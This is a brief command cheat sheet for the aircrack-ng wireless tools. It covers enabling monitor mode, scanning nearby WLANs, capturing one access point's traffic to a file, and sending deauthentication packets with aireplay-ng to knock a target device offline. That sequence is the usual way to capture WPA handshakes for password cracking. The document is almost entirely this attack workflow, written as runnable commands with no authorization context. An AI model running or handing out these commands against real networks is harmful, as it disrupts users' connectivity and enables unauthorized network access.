# Detect wlans

```bash
airmon-ng
```

Start monitor mode

```bash
airmon-ng start wlan1
ifconfig
airodump-ng wlan1mon
airodump-ng -w /path/to/save/files/ -c 1 --bssid WL:AN:MAC wlan1mon
aireplay-ng -0 10 -a WLAN:MAC -c DEVICE:MAC wlan1mon
```

Stop monitor mode

```bash
airmon-ng stop wlan1mon
```
